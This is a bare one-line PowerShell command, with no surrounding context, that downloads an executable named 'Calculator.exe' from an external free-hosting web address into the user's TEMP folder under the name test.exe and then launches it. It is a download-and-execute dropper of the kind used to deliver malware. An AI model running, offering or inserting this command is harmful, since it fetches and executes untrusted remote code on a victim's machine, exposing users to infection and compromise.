
(New-Object System.Net.WebClient).DownloadFile('http://lvrxd.3eeweb.com/nano/Calculator.exe',"$env:TEMP\test.exe");Start-Process ("$env:TEMP\test.exe")

